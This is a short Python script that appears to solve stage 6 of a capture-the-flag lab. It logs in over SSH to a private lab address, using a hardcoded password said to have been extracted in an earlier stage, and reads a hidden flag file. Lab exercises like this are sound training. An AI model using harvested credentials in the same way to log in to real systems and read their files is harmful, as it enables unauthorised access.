import paramiko
import sys


def main():
    hostname = "192.168.56.23"
    port = 22
    username = "dev_admin"
    password = "MetasploitR0ckz!"

    print(f"[*] Connecting to {hostname} as {username}...")

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect using the credentials extracted from Stage 5
        client.connect(hostname, port, username, password)
        print("[+] SSH connection established!")

        # Execute command to read the hidden flag
        stdin, stdout, stderr = client.exec_command("cat ~/.source_vault/master_flag.txt")

        flag = stdout.read().decode().strip()

        if flag:
            print(f"[+] Hidden vault accessed!")
            print(f"[SUCCESS] Stage 6 Master Flag: {flag}")
        else:
            print("[!] Flag file not found or empty.")

        client.close()

    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()